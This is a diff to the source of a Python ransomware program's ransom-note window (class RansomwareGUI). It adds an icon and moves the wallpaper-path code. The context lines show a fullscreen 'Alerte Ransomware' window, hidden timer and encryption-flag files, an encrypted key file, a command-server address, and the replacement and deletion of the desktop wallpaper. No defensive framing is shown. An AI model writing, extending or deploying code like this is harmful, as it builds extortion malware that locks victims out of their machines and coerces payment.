@@ -31,12 +31,18 @@ class RansomwareGUI:
     TIMER_FILE =  os.path.join(hidden_dir, "timer_data.txt")
     LOG_FILE =  os.path.join(hidden_dir, "interaction_log.txt")
     NEW_WALLPAPER =  os.path.join("wallpaper", "wallpaper.png")
+    ICO =  os.path.join("client", "favicon.ico")
     ENCRYPTION_FLAG =  os.path.join(hidden_dir, "encryption_done.flag")
     KEY_FILE = os.path.join(hidden_dir, "keys", "encrypted_symmetric_key.bin")
 
     def __init__(self, root):
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        wallpaper_path = os.path.join(script_dir, self.NEW_WALLPAPER)
+        ico_path = os.path.join(script_dir, self.ICO)
+
         self.root = root
         self.root.title("Alerte Ransomware")
+        self.root.iconbitmap(ico_path)
         self.root.attributes("-fullscreen", True)
         self.root.configure(bg="#1e1e1e")
         self.root.resizable(True, False)
@@ -48,8 +54,6 @@ class RansomwareGUI:
         self.server_ip = self.config['SERVER']['client_ip']
         self.server_port = self.config['SERVER']['client_port']
 
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-        wallpaper_path = os.path.join(script_dir, self.NEW_WALLPAPER)
         self.set_wallpaper(wallpaper_path)
         os.remove(wallpaper_path)
 
